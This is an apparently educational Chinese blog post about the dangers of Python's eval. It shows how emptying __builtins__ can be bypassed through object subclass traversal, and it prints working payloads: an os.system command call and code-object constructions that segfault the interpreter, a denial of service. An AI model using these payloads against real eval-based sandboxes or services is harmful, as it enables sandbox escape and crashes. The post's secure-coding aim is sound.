---
title: Python的Eval和字节码
date: 2020-01-02 18:50:38
author: repoog
excerpt: 本文介绍在Python程序中如何利用不安全的函数evil来实现对于拒绝服务攻击代码的执行，以及其攻击原理。
comments: true
tags:
  - Python
  - 字节码
  - 安全开发
  - 拒绝服务
  - 恶意代码
categories:
  - 软件安全
---

有人在Twitter上发了张图，显示Python官方的示例打码中使用了不安全的函数eval，用"intext:eval site:svn.python.org filetype:py"可以找到更多示例代码。有人说既然能运行Python，有没有用eval不重要。无论在哪种编程语言中，eval函数都是不安全的函数，要慎用，这是良好编程习惯的问题，其次，像开启Debug模式的Flask应用，即便不直接接触系统，也可以通过eval do evil。

Python的内建函数 eval 完整函数定义是eval(source, globals=None, locals=None)，字符串或代码对象传入source参数执行Python代码，执行的全局上下文和本地上下文环境通过globals和locals定义。比如通过eval("\_\_import\_\_('os').system('ls')")执行ls命令。

\_\_import\_\_是import的内部实现方式，返回的是参数传入的模块，而\_\_import\_\_本身也是内建built-in函数，因此可以通过设置eval的globals参数，将\_\_builtins\_\_对象置空来禁用builtins对象相关的内建函数和常量，比如\_\_import\_\_、print、True、None。

``` Python
eval("__import__('os').system('ls')", {'__builtins__':{}})
```

全局环境\_\_builtins\_\_置空后，eval执行将返回函数未定义的错误，包括基类object。但\_\_builtins\_\_对象并不包含list、tuple、\_\_class\_\_（获取实例所属的类）、\_\_bases\_\_（获取类的基类）、\_\_subclasses\_\_（获取类的子类），而list和tuple也是object类的子类。因此通过list实例或tuple实例可以获取到object类，进而获取到所有的类 ，从而绕过\_\_builtins\_\_对象被禁用而无法使用object类。

``` Python
().__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()
```

通过以上代码可以获取object类的所有子类，结合列表推导，可以得到任意类对象：

``` Python
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'code'][0]
```

从class code的\_\_doc\_\_可知，这个类的构造函数可以用于创建新的代码对象（即PyCodeObject\* PyCode\_New()），代码对象是描述字节码的结构，字节码继而在Python虚拟机中执行，但代码对象未绑定到具体函数。PyCode\_New()有13个必填参数，第6个参数是字节码（代码对象的co\_code属性），第13个参数是字节码的行号表（代码对象的co\_lnotab属性）。

``` Python
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'code'][0](0, 0, 0, 0, 0, b'', (), (), (), '', '', 0, b'')
```

以上代码创建的代码对象被eval调用，会因为段错误导致Python解释器退出，即拒绝服务攻击。

``` Python
eval([c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'code'][0](0, 0, 0, 0, 0, b'hello', (), (), (), '', '', 0, b'', (), ()), {"__builtins__":{}})
```

或者结合class function的函数对象（PyObject\* PyFunction\_New），用字符串（字节码参数不能为空）传入eval产生同样的效果。

``` Python
eval("[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'function'][0]([c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'code'][0](0, 0, 0, 0, 0, b'b', (), (), (), '', '', 0, b'', (), ()), {})()", {"__builtins__":{}})
```

如果没有内建函数的限制，compile可以更简单地将py文件或py字符串编译成代码对象。如果代码对象结构的各个属性传入正确，可以通过eval或exec正确执行字节码。